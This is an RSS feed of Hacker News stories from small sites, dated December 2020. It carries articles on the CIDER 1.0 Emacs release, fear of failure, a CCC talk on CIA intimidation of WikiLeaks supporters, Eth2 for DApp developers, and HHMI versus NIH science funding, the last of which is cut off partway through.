<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Thu, 31 Dec 2020 08:50:20 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Thu, 31 Dec 2020 08:50:20 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Cider 1.0]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25568181">thread link</a>) | @rayxi271828
<br/>
December 29, 2020 | https://metaredux.com/posts/2020/12/28/cider-1-0.html | <a href="https://web.archive.org/web/*/https://metaredux.com/posts/2020/12/28/cider-1-0.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <blockquote>
  <p>You can’t really know where you are going until you know where you have been.</p>

  <p>– Maya Angelou</p>
</blockquote>

<p><a href="https://cider.mx/">CIDER</a> started its life as an effort to replace a
hacked version of SLIME<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> with a proper environment for Clojure
development on Emacs. Many of you probably don’t remember those days,
but initially almost everyone was using a modified version of SLIME
for Clojure development, as there weren’t many (any?) alternatives
back in the day. The creation of CIDER was fueled mostly by the advent of
<a href="https://nrepl.org/">nREPL</a>, which was the first project that aimed to
provide a common tool-agnostic foundation for Clojure development
tools, and by the desire to address the impedance mismatch between
SLIME and Clojure.</p>

<p>CIDER was started in spring 2012 (under the name <code>nrepl.el</code>) by Phil
Hagelberg (of Leiningen fame), who hacked a prototype of an nREPL
client in Emacs Lisp on a flight to San Francisco. He got a bit stuck
on the socket-based bencode functionality and dropped it after the
flight, but not before pushing the code out and mentioning it on the
<a href="http://groups.google.com/group/clojure/browse_thread/thread/2bd91de7dca55ca4">Clojure mailing
list</a>.
What followed is the best example of the power of open-source software…</p>

<p>Tim King came across Phil’s post, picked <code>nrepl.el</code> back up, and it quickly became
a respectable competitor to SLIME. The project evolved at a rapid pace
and eventually superseded SLIME in August 2012.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Unfortunately in
early 2013 Tim ran out of time for nrepl.el and after another period of
stagnation, handed it over to me, as I was the main
contributor to <code>nrepl.el</code> besides him back then. I have been the project’s
steward ever since. Third time’s a charm, right?</p>

<p>My tenure at the helm started with a bit of
controversy as I renamed nrepl.el to CIDER in version 0.3 to avoid the
common case of confusion between the nREPL server and the <code>nrepl</code>
package for Emacs.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> If I have to be completely honest - I also
wanted the project to have a name as cool as SLIME, and I’m fairly
certain I succeeded in that regard.</p>

<p>Eventually CIDER became one of the most popular development
environments in the Clojure community and it spawned many important
projects (e.g. <code>cider-nrepl</code> and <code>orchard</code>), that are widely
used by other development tools (e.g. <code>vim-fireplace</code>, Conjure, <code>iced-vim</code> and Calva). My work on CIDER also led to me
becoming the maintainer of nREPL and restarting its development
after a long period of hibernation. In hindsight probably the work
I did on nREPL was even more important than the work I did on CIDER.</p>

<p>Over the years a big ecosystem of packages grew around CIDER and nREPL
and they became important parts of the Clojure development
tooling. Today CIDER and nREPL face a lot of competition, but they are still
evolving at a steady pace, occasionally innovating, and serving as inspiration for
other tools. That makes me proud of the work we’ve done over the past 8 and a half years,
even if fewer and fewer people are using CIDER and Emacs every year.</p>

<p>One thing that constantly eluded me, however, was a 1.0 release. I
guess I’m the one to blame for this not happening sooner, as I had
some really grand ambitions for CIDER 1.0 (and some rather high
quality standards to go with them) and I was optimistic that somehow my plans would
become a reality in a reasonable amount of time.  Clearly I was
mistaken. Between me having to split my time between a dozen OSS projects
and most of them currently having no other active maintainers but me,
it eventually became obvious that the grand plans will have to wait
for CIDER 2.0. Grand plans and ambitions for world domination aside,
CIDER has been pretty stable for a while now and it seems to get the
job done. And there’s also the theory that if a piece of software has
some (happy) users then it qualifies for a 1.0 release… Oh, well…</p>

<p>Today the long wait is over - <a href="https://github.com/clojure-emacs/cider/releases/tag/v1.0.0">CIDER 1.0
(“Sofia”)</a>
is officially out!<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>  There’s nothing particularly interesting in this
release - it’s almost the same as CIDER 0.26. If you notice one
difference, it would probably be that commands that act on the symbol
at point (e.g. <code>cider-doc</code>) will no longer prompt you to confirm the
symbol. The old default was a mistake and I decided to adjust it for
this grand release. If you notice another difference, it’d probably be
that CIDER is officially using SemVer now. I still have to define
what exactly is going to constitute a breaking change going forward (e.g.
are changes to keybindings breaking changes?), but I’m reasonably
sure the adherence to SemVer will make CIDER upgrades less painful
for everyone.</p>

<p>There are many things that prompted me to do the 1.0 release now, but
probably the most important factor was that 2020 was such a horrible
year for all of us. I felt we needed all the good news we could
get to counter all the pain and suffering we’ve had to endure. While I
can’t help the fight against the pandemic, I hope I can cheer you up a
bit, by delivering another iteration of your favorite software that rocks.</p>

<p>So, what’s next? I don’t really have any particular plans for CIDER 1.1, so we’ll see how exactly it’s
going to shape up. Some vague ideas that have been floating in my mind are proper support for sideloading,
adding support for dynamic middleware loading, and improvements to the session management. No promises, though.
I’m also aiming to finally do an nREPL 1.0 release at some point. There are plenty of tickets
marked with the label “Good First Issue” on CIDER’s issue tracker, so if you’re looking for
more fun challenges after the end of the “Advent of Code” be my guest. I can definitely use all the help
I can get.</p>

<p>One thing is certain, though - CIDER will always stay true to its guiding principles:</p>

<ul>
  <li>REPL-first (as opposed to relying on static code analysis)</li>
  <li>Community-first (CIDER is defined by its community)</li>
  <li>Keep on rocking in a Lisp world!</li>
</ul>

<p>I’m writing this article while enjoying a bottle of proper (hard) French cider, so I think
I should wrap it up before I start enjoying myself too much.
Thanks to everyone who has been a part of CIDER’s community over the years! Thanks to everyone who has contributed to the project and supported it! Thanks
to everyone who still loves Emacs and CIDER! This release is for all of you!
Cheers!</p>



  </div></div>]]>
            </description>
            <link>https://metaredux.com/posts/2020/12/28/cider-1-0.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568181</guid>
            <pubDate>Tue, 29 Dec 2020 09:33:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Overcome the Fear of Failure as an Entrepreneur]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25568011">thread link</a>) | @vitabenes
<br/>
December 29, 2020 | https://www.deprocrastination.co/blog/how-to-overcome-fear-of-failure | <a href="https://web.archive.org/web/*/https://www.deprocrastination.co/blog/how-to-overcome-fear-of-failure">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>One of the most common causes of procrastination is the fear of failure.</p><p>Let’s imagine we have a task to do and we feel negative about it for some reason.</p><p><img src="https://www.deprocrastination.co/assets/book_images_2/image19.png" referrerpolicy="no-referrer" alt="Negative emotions are like a hill"></p><p>That makes it harder to do, but we can&nbsp;<em>make it even harder</em>. Much harder. How?</p><p>We might think&nbsp;<strong>we cannot possibly make a single mistake.</strong></p><p>Maybe we adopted this attitude from our parents or our teachers in school. Whatever the reason, many of us fear failure and don’t see it as a natural part of the process.</p><p>So, failure turns from something natural, though unpleasant, into a lethal threat.&nbsp;<strong>Every simple task becomes a tightrope walk over a deadly chasm.</strong></p><p><img src="https://www.deprocrastination.co/assets/book_images_2/image27.png" referrerpolicy="no-referrer" alt="Fear of failure is like a chasm"></p><p>No wonder the fear of failure is so paralyzing. When we perceive every mistake as a possible death (or sacking, or dropping out, or a proposal rejection), it raises our stress levels and we try to relieve them by procrastinating.</p><p>We make ourselves into a tightrope walker.</p><h2><strong>What a tightrope walker believes</strong></h2><h3><strong>If I fail, I’m worthless and destined to die</strong></h3><p><em>If this business fails, I’m clearly someone who can’t have any kind of business.</em></p><p><em>If this book doesn’t hit the bestseller list, I’m clearly not a good writer.</em></p><p><em>If I don’t pass this subject, I’m clearly never going to be good at it.</em></p><p>Some of us have a tendency to view failure as a fatal verdict.</p><p><em>If I fail, I’m clearly not good enough.</em></p><p>When we fail (which we inevitably will at some point), we can take it as the end. We get crushed.</p><p><em>Well, better do something else.</em></p><p>The thing is, everyone fails. We lose money, we lose partners, projects fail… but not all of us react in the same way.</p><p><img src="https://www.deprocrastination.co/assets/book_images_2/image43.png" referrerpolicy="no-referrer" alt="Different reactions to failure"></p><p><strong>Most of the time, failure isn’t a fall off a cliff.</strong></p><p>We humans have an uncanny ability to recover from all sorts of mistakes,&nbsp;<em>if we allow ourselves to.</em></p><p>It’s foolish to expect that we'll be good at everything we try and won’t fail ever.</p><p>Let’s update our view of failure.</p><h3><strong>When I fail, I’ll get back on my feet</strong></h3><p>Everything doesn’t depend on one single performance most of the time.</p><p><strong>When you look at the lives of successful people, we see that they failed many, many times.</strong></p><p>Legendary investor Ray Dalio at one point lost all his money. Entrepreneur Elon Musk at one point didn’t have enough money for rent. Apple founder Steve Jobs was at one point kicked out of the very company he started!</p><p>If these people took those failures as fatal diagnoses of their worthlessness, neither one of them would build billion dollar companies.</p><p>They learned from their failures and got back into a ring.</p><p><strong>Failures big and small happen all the time. The important part is recovering, learning from them (so then they don’t repeat) and taking them in stride.</strong></p><h3><strong>Performance = my self-worth</strong></h3><p>As with perfectionists, people who fear failure identify with their work.</p><p>New project? If it doesn’t pan out, I’m a failure.</p><p>Test in school? If I get an F, I’m an idiot.</p><p>If I’m not first, I’m below average.</p><p><img src="https://www.deprocrastination.co/assets/book_images_2/image55.png" referrerpolicy="no-referrer" alt="Self-worth tied to an outcome"></p><p>Failure is not a fatal diagnosis. One F doesn’t make someone an idiot, it simply points to their current level of mastery of the subject. And that level can improve with effort.</p><p><strong>Failure is not a diagnosis of worthlessness.</strong></p><h3><strong>Performance = current level of ability, I can always improve</strong></h3><p>You’re at a competition and you lose.</p><p>You’re taking a test and you hand in an empty test with just your name.</p><p>You make a presentation on the wrong topic.</p><p>Happens to everyone. You can’t win every contest and succeed with every project for the rest of your life.</p><p>So why not take a particular performance (presentation, project, test,...) as just one performance at one point in time?</p><p>Every product of our effort is a clue whether we’re going in the right direction or not.</p><p>Bad performance? Okay, what do we have to change? How can I get better at this?</p><p>Good performance? Awesome, let’s go full steam ahead.</p><h2><strong>Mindset shifts</strong></h2><p>To summarize, here are the 2 main mindset shifts to take away:</p><ul><li>When I fail, I take it as a fatal diagnosis of my worthlessness.<br>→<br><strong>When I fail, I’ll reflect on how I can improve.</strong></li><li>My performance = my self-worth.<br>→<br><strong>My performance = my current level of ability.</strong></li></ul><p>Now let’s take a look at some tools and exercises that can help us manage and reduce the fear of failure.</p><div><div><p>Hi there! This is a free sample chapter from our book.</p><p>If you want to get a whole comprehensive guide about procrastination and learn about each fear deeply,&nbsp;<a href="https://www.deprocrastination.co/guide">check out our handbook.</a></p><p>We put hundreds of hours of research into it, so you don’t have to. And also we keep updating it often to give you the best, most concrete strategies for dealing with procrastination.</p></div></div><h2><strong>1. Put the fear of failure into perspective</strong></h2><h3><strong>How to overcome fear: Understand your options</strong></h3><p>We sometimes think that our situation is one big dead-end.</p><p>We might have a job we depend on and be unable to do what we want because it would mean losing it.</p><p>Or we might have one big project we’re working on that would sink us deep into debt if it didn’t pan out.</p><p>The problem with scenarios like this is that they put tremendous pressure on us.</p><p>And we try to ease it off by procrastinating.</p><p>If we have one thing to do and its failure would mean the end of the world, every step we’re unsure of becomes a tightrope walk.</p><p>One email or a blank page of a document turns into the possibility of apocalypse.</p><p>Who wouldn’t be stressed in a situation like that?</p><p>What if we could ease the pressure a little more?</p><h2><strong>Use the fear of regret</strong></h2><p><img src="https://www.deprocrastination.co/assets/book_images_2/image13.png" referrerpolicy="no-referrer" alt="Fear of regret outweighing fear of failure"></p><p>Elon Musk estimated the odds of his success with SpaceX to be about 40%.</p><p>Jeff Bezos thought Amazon had about 30 % chance of succeeding.</p><p>How then could they make the decision to start? How come they didn't worry and dwell on those odds? How could Musk invest millions of his own money into SpaceX?</p><p><strong>Because it was worth it.</strong></p><p>Fear is only one side of the equation. Depression, regret, sadness,.. those are on the other side.</p><p>For Musk, the other side of the equation was profound sadness. If humanity couldn't go to Mars, that would be depressing to him on a fundamental level.</p><p>For Bezos, it was regret that helped him overcome his fear. He read that the Internet was growing 2300 % a year. That seemed like a great opportunity. But he already had a great job in New York, how could he leave it and start from scratch something risky?</p><h2><strong>2. Set yourself up to learn if you fail</strong></h2><p>As we mentioned before,&nbsp;<strong>failure is most often not fatal, especially when it comes to business or creative endeavors.</strong></p><p>Yes, you might give a bad presentation. You might paint a lousy portrait. You might cause someone discomfort because your app didn't work. That happens. It's not the end of the world.</p><p><strong>Failure doesn't feel great, but you'll survive. You'll get back up and try again.</strong></p><h3><strong>"It might not work"</strong></h3><p>Seth Godin, a best-selling author and master marketer, often repeats this phrase:</p><p><em>"Do things that might not work."</em></p><p>Why does he do that?</p><p><strong>This phrase acknowledges that in creative work you might fail, you might disappoint someone, you might feel bad, but you should still try. You should still try to innovate, to push yourself, to create.</strong></p><p>So there's always some risk of failure, but a) the failure is most often not fatal and b) you can reduce the risk of failure.</p><h2><strong>Summary:<br>Failure is not fatal, it’s a stepping stone</strong></h2><p>Failures, mishaps, personal embarrassments,... they aren’t the end of the world even though it may seem like it at the moment.</p><p><strong>Failure in the right direction is a good thing.</strong></p><p>Exercises like negative visualization or plan B and Z help us prepare for potential catastrophes and also dispel unnecessary fear.</p><p>When you find yourself procrastinating because of the fear of failure:</p><ol><li><p>Put the fear of failure into perspective</p><ol><li><strong>Negative visualization</strong><br>Think about the worst-case scenario. Imagine it vividly. What's really the worst case</li><li><strong>Plan B and Z</strong><br>Think what your plan B would be if you failed with A. How could you make a living then? And if sh*t hits the fan, create a contingency plan (plan Z). What would you do if everything fails?</li><li><strong>Regret minimization framework</strong><br>Ask yourself:<br><em>When I'm 80 and looking back on my life, would I regret not taking this opportunity?</em>&nbsp;<br>Use your fear of regretting something for the rest of your life to overcome the fear of failure and take the leap.</li><li><strong>Win-win</strong><br>Ask yourself:<br><em>How would I win even if I failed?</em></li></ol></li><li><p>Set yourself up to learn if you fail</p><ol><li><strong>Reduce risk by experimenting</strong><br>Try things in private, free of judgment. Test your ideas.</li><li><strong>Reflect on past failures</strong><br>Remember Ray Dalio's mantra:<br><em>Pain + Reflection = Progress</em></li></ol></li></ol><p>These 6 tools will help you overcome your fear of failure and stop procrastinating. We hope you find them useful.</p></article></div>]]>
            </description>
            <link>https://www.deprocrastination.co/blog/how-to-overcome-fear-of-failure</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568011</guid>
            <pubDate>Tue, 29 Dec 2020 09:00:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CIA vs. WikiLeaks: Intimiditation surveillance and tactics observed/experienced]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25567659">thread link</a>) | @pdkl95
<br/>
December 28, 2020 | https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks | <a href="https://web.archive.org/web/*/https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=andy">andy</a>

</p>

<p><a href="https://media.ccc.de/c/rc3/rC3" rel="tag">rC3</a>
<a href="https://media.ccc.de/c/rc3/Ethics,%20Society%20&amp;%20Politics" rel="tag">Ethics, Society &amp; Politics</a>
Playlists:
<a href="https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks/playlist">'rc3' videos starting here</a>
/
<a data-method="get" href="https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks/audio">audio</a></p>
<!-- %h3 About -->
<p>In this talk, I aim to report and show a collection of observations, physical, visual and other evidence of the last years incidents that strongly indicate a context of the US Central Intelligence Agency and/or potentially other entities of the US Government actions against Wikileaks and surrounding persons and organisations.</p>

<p>While the area of technical surveillance, SIGINT/COMINT and related Organizations and Methods have been more or less well understood in the hacker scene, the tactics and methods experienced and discussed in this talk are of a different type: For the moment, I would call it "initimidation surveillance" as it lacks the aspect of "covert" type of actions.</p>

<p>On the last Chaos Communication Congress, I have analysed the technical aspects of the surveillance in and surrounding the ecuadorian embassy where Julian Assange stayed; this talk shows what happened to other people - friends of Assange, supporters of Wikileaks etc - not only in England, but also in other countries / other parts of the world. </p>

<p>The idea is to not only show the scope of activities but also to contribute to a better understanding of these tactics, that might be applied also in completely different political environments where governments act in extralegal ways against activities they dislike, although they that are not a crime or easily criminalized.</p>

<h3>Download</h3>
<div>
<div>

<div>

<div>
<div>
<h4>These files contain multiple languages.</h4>
<p>
This Talk was translated into multiple languages. The files available
for download contain all languages as separate audio-tracks. Most
desktop video players allow you to choose between them.
</p>
<p>
Please look for "audio tracks" in your desktop video player.
</p>
</div>
</div>
</div>


</div>

</div>
<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]>
            </description>
            <link>https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks</link>
            <guid isPermaLink="false">hacker-news-small-sites-25567659</guid>
            <pubDate>Tue, 29 Dec 2020 07:44:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Eth2 and your DApps: What you need to know]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25567208">thread link</a>) | @toxzic
<br/>
December 28, 2020 | https://chainstack.com/eth2-and-your-dapps/ | <a href="https://web.archive.org/web/*/https://chainstack.com/eth2-and-your-dapps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img loading="lazy" width="1024" height="542" src="https://chainstack.com/wp-content/uploads/2020/12/image-1024x542.png" alt="" srcset="https://chainstack.com/wp-content/uploads/2020/12/image-1024x542.png 1024w, https://chainstack.com/wp-content/uploads/2020/12/image-300x159.png 300w, https://chainstack.com/wp-content/uploads/2020/12/image-768x407.png 768w, https://chainstack.com/wp-content/uploads/2020/12/image-1536x813.png 1536w, https://chainstack.com/wp-content/uploads/2020/12/image-530x281.png 530w, https://chainstack.com/wp-content/uploads/2020/12/image-330x175.png 330w, https://chainstack.com/wp-content/uploads/2020/12/image.png 1700w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>Do I as a DApp developer need to change my DApps and my DApp building routine and/or architecture?</p><p>No. Your DApps are safe for at least a couple of years.</p><h2>A longer explanation</h2><p>The complete Ethereum 2.0â€”officially referred to as Eth2â€”implementation and mainnet is rolled out in phases:</p><ul><li>Phase 0 â€” launched on December 1, 2020 with the Beacon Chain.</li><li>Phase 1 â€” tentative for 2021 with the introduction of shard chains.</li><li>Phase 1.5 â€” tentative for 2021 or 2022 with the docking of Eth1 to Eth2.</li><li>Phase 2 â€” no defined plans.</li></ul><p>Each of the phases introduces changes to Eth2 and how it interacts with Eth1 where your DApps are.</p><p>Letâ€™s have a look at each of the phases and if they can potentially make you change the way you work with your DApps.</p><h2>Will anything change for me after Phase 0 is initiated?</h2><p>No.</p><h3>A longer explanation</h3><p>On December 1, 2020, the Beacon Chain launched and marked the official start of Phase 0.</p><p>Whereas the Beacon Chain is the foundational component of Eth2, it’s not the full Eth2 implementation.</p><p>With the launch of Phase 1, the Beacon Chain will start validating shard chains. Until then, the Beacon Chain is a network of stakers validating blocks on the chain.</p><p>The Beacon Chain itself cannot handle Ethereum accounts and smart contracts. Accounts and smart contracts can only be done on shard chains, and even that won’t be immediately available in Phase 1.</p><p>The Beacon Chain consists of Beacon nodes and Validator clients.</p><p>To just keep an up-to-date copy of blocks on the Beacon Chain, you need a Beacon node.</p><p>To be a validator on the Beacon Chain, you need both a Beacon node, a validator client, and an Eth1 node. The Beacon node connects to the Eth1 node to monitor the Eth2 staking deposit address on Eth1 for new validators on the Beacon Chain.</p><p>The Eth1 mainnet itself is completely “unaware” of the existence of Eth2 in the form of Beacon Chain.</p><p>Architecturally, your existing DApps or your DApp building routine wonâ€™t see changes during Phase 0.</p><h2>Will anything change for me after Phase 1 is initiated?</h2><p>No.</p><h3>A longer explanation</h3><p>At some point in 2021, Eth2 will see the introduction of shard chainsâ€”the proof-of-stake chains running in parallel and coordinated by the Beacon Chain.</p><p>The Beacon Chain will be assigning validators to the shard chains and will also keep the shards up-to-date with each other.</p><p>The shard chains will first be introduced as version 1. In version 1, the shards will not be capable of executing smart contracts; they will only store the data necessary to execute smart contractsâ€”for example, time stamps, oracle data, byte information required to interact with other shards.</p><p>Version 2â€”when or if introducedâ€”will see the execution of smart contracts on the shards.</p><p>Architecturally, your existing DApps or your DApp building routine wonâ€™t see changes during Phase 1.</p><h2>Will anything change for me after Phase 1.5 is initiated?</h2><p>No, but your DApps will start responding faster, since this is when Eth2 will presumably be locked to 12 second blocks.</p><p>You wonâ€™t have to change in your smart contracts, but the centralized parts of your DAppsâ€”e.g., a web appâ€”will be fetching a quicker response to your users.</p><h3>A longer explanation</h3><p>In 2021 or 2022, the Eth1 mainnet will switch from the current proof-of-work to the proof-of-stake consensus algorithm and will be “docked” into Eth2. The process of docking, in this case, means that the Eth1 mainnet will become one of the shards of Eth2 coordinated by the Beacon Chain.</p><p>Architecturally, your existing DApps or your DApp building routine wonâ€™t see changes during Phase 1.5.</p><h2>Will anything change for me after Phase 2 is initiated?</h2><p>Yes, but what exactly will change is uncertain at this point.</p><h3>A longer explanation</h3><p>As of today, Phase 2 is not clearly defined, however this is when you might see the most changes affecting you as a DApp developer as it may have the introduction of a new Ethereum Virtual Machine.</p><p>Your existing DApps and your DApp building routine will see significant changes during Phase 2. However, at this point, there is no defined strategy on how you can be prepared for the changes other than staying up-to-date with the Eth2 developments and being a Chainstack user.</p><p><a href="https://console.chainstack.com/user/account/create" target="_blank" rel="noreferrer noopener">With Chainstack</a>, you will be prepared for Phase 2 with as little effort from you as possibleâ€”the infrastructure migration will be as seamless as viable, you will be notified of the necessary changes on your end well in advance and be supported by our extensive documentation.</p><h2>Run an Eth1 node for your Eth2 client today</h2><p><a href="https://console.chainstack.com/user/account/create" target="_blank" rel="noreferrer noopener">Run a reliable dedicated Eth1 node</a> that you can link to your Beacon node.</p><p>See also <a href="https://support.chainstack.com/hc/en-us/articles/900004755663-Connecting-your-Chainstack-Eth1-node-to-a-Prysm-Beacon-node" target="_blank" rel="noreferrer noopener">Connecting your Chainstack Eth1 node to a Prysm Beacon node</a>.</p><h2>Get early access to Eth2 nodes</h2><p><a href="https://pages.chainstack.com/ethereum-2.0" target="_blank" rel="noreferrer noopener">Contact us to get an early access to Eth2 nodes</a>.</p><h2>Join our community of innovators</h2><ul><li>To learn more about Chainstack, visit our <a href="https://docs.chainstack.com/" target="_blank" rel="noreferrer noopener">Knowledge Center</a> or join our <a href="https://gitter.im/chainstack/Lobby" target="_blank" rel="noreferrer noopener">Gitter Lobby</a>.</li><li>Sign up for a <a href="https://console.chainstack.com/user/account/create" target="_blank" rel="noreferrer noopener">free Developer account</a>, or explore the options offered by <a href="https://chainstack.com/pricing/" target="_blank" rel="noreferrer noopener">Growth or Business plans</a>.</li><li>Take a look at our pricing tiers using a <a href="https://chainstack.com/pricing/" target="_blank" rel="noreferrer noopener">handy calculator</a> to estimate usage and number of nodes.</li></ul><p>Have you already explored what you can achieve with Chainstack? <a rel="noreferrer noopener" href="https://console.chainstack.com/user/account/create" target="_blank">Get started for free today</a>.</p></div></div>]]>
            </description>
            <link>https://chainstack.com/eth2-and-your-dapps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25567208</guid>
            <pubDate>Tue, 29 Dec 2020 06:06:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fund People, Not Projects]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25566953">thread link</a>) | @elsewhen
<br/>
December 28, 2020 | https://nintil.com/hhmi-and-nih | <a href="https://web.archive.org/web/*/https://nintil.com/hhmi-and-nih">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>So there's this paper, <em>Incentives and Creativity: Evidence from the academic life sciences</em> (Azoulay, Graff Zivin, Manso <a href="https://onlinelibrary.wiley.com/doi/abs/10.1111/j.1756-2171.2011.00140.x">2011</a>) that shows that Howard Hughes Medical Institute (HHMI) investigators (who are funded for a longer term and in a more open ended way) outperform those of the National Institutes of Health (NIH) that have shorter review cycles and more concrete grant proposals. This is seen as a vindication of the "<a href="https://twitter.com/pierre_azoulay/status/1141118605985308674">fund people, not projects</a>" paradigm. However, the effect sample reported is <em>huge</em> , perhaps too good to be true, and the extent to which this model can scale is debatable, as Azoulay himself also <a href="https://twitter.com/pierre_azoulay/status/1318578977527668736">says</a> that <em>it is not clear how well this model can scale. HHMI is very much focused on a narrow elite</em>.</p>
<blockquote>
<p>Similarly, while science generates much of our prosperity, scientists and researchers themselves do not sufficiently obsess over how it should be organized. In a recent paper, Pierre Azoulay and co-authors <a href="https://www.nber.org/papers/w15466">concluded</a> that <strong>Howard Hughes Medical Institute’s long-term grants to high-potential scientists made those scientists 96 percent more likely to produce breakthrough work</strong>. If this finding is borne out, it suggests that present funding mechanisms are likely to be far from optimal, in part because they do not focus enough on research autonomy and risk taking. (<a href="https://www.theatlantic.com/science/archive/2019/07/we-need-new-science-progress/594946/">We need a new science of progress</a>)</p>
</blockquote>
<p>
[1]. There are other NIH similar grants like the MERIT award or the Outstanding Investigator Award (R35)
</p>
<p>NIH has their own HHMI-style throw-money-at-the-best program, the Director's Pioneer award (DP1)<sup><a href="#sidenote-1">1</a></sup> which also seems to produce <a href="https://commonfund.nih.gov/sites/default/files/HRHR%20PA%20FY%202004-2006%20Outcome%20Evaluation.pdf">great</a> <a href="https://dpcpsi.nih.gov/sites/default/files/CoC-051413-Pioneer-Award-Program-DP1.pdf">results</a>. <a href="https://commonfund.nih.gov/pioneer">DP1</a> grants are similar to the HHMI Investigators program (700k per year vs ~1M at HHMI) and as selective (11 pioneers per year vs 20 for HHMI). They are not as long-lasting as the HHMI ones however in that they last for 5 years while HHMIs enjoy a theoretical 7 and a practical 15 years of funding. </p>
<p>Both have been lauded as exemplary programs that <em>cause more good science to happen that otherwise would not</em>.</p>
<p>So this seems like an important "huge if true" fact. Even if, as Azoulay suspects, this model cannot scale, it is reasonable to think that the scientific elite that would benefit from this class of funding is comprised of more than the current 250 HHMI investigators and 50 or so DP1 awardees.</p>
<p>So with this setup, let's look at first the general question (people, not projects) and then the specifics of NIH and the HHMI once we have a framework to assess them.</p>
<h2 id="fund-people-not-projects">Fund People, not projects</h2>
<p>The usual way grants are allocated is a process whereby a scientist says they want to do specific piece of work X and then they get money to do that. In <a href="https://guzey.com/how-life-sciences-actually-work/">practice</a>, researchers have already done part of what they say they will do (And use that data to support the application), and will use part of the funds to work on other things they may want to work on so they can do as they please with <em>part</em> of their time and money. But for the most part, they are working on what they say they are working on. R01 grants, the bulk of NIH's funding, run for 5 years (And this has gone <a href="https://nexus.od.nih.gov/all/2013/11/07/how-long-is-an-r01/">up</a> over time), not too dissimilar, at first glance, to the HHMI's 7.</p>
<p>With DP1 and HHMI, researchers do not submit a grant proposal for something specific they want to do, they submit their resume and a <strong>broad summary of what they are going to be working on</strong>. This research program (3k words) is shorter than a usual Nintil blogpost, and substantially shorter than one of the sample R01 grant applications from the NIAD's <a href="https://www.niaid.nih.gov/sites/default/files/1-R01-AI121500-01A1_Gordon_Application.pdf">website</a> which are over 5x longer (excluding references and CVs). </p>
<p>
[2]. Azoulay et al. 2011 states that 'Moreover, HHMI investigators appear to share the perception that their first appointment review is rather lax, with reviewers more interested in making sure that they have taken on new projects with uncertain payoffs, rather than insisting on achievements. Below, we validate this perception by showing that the second review is much more sensitive to performance than the first.'
</p>
<p>Both are similar in that they can be renewed; if one wants to work on a 20 year project, in theory one can roll the <a href="https://www.niaid.nih.gov/grants-contracts/apply-renewal">same</a> R01 four times, with the <a href="https://nexus.od.nih.gov/all/2016/02/16/are-attempts-at-renewal-successful/">likelihood</a> of being renewed starting at 30%. HHMI is more forgiving once one is in and in the event one is out: it provides <a href="https://www.hhmi.org/sites/default/files/Programs/Investigator/2018-HHMI-Investigator-Competition-FAQ.pdf">two years of phase-out</a> if a renewal is not successful and the renewal rate is &gt;80% anyway, leading to a median of 16 years of <a href="https://twitter.com/JSheltzer/status/1208442925249630209">support</a><sup><a href="#sidenote-2">2</a></sup>. Thus HHMI investigators can expect to be funded for longer, and because if they lose funding they don't have to be immediately looking for support, that should also help keep their eyes in the long term. This is not to say that HHMI investigators do not spend time applying for grants, you can search <a href="https://projectreporter.nih.gov/reporter.cfm">here</a> for example <a href="https://en.wikipedia.org/wiki/Feng_Zhang">Feng Zhang</a> (HHMI since 2018) and see that he got a DP1 in 2020 as well as R01s in 2020 and 2019. Even <a href="https://en.wikipedia.org/wiki/David_J._Anderson">David J. Anderson</a> (HHMI since 1989) can be seen applying for R01s in the same site. This is because the HHMI award, generous as it is, covers the investigator's salary, some research budget, special expenses for expensive equipment, but not every expense, and not the hiring of additional lab members.</p>
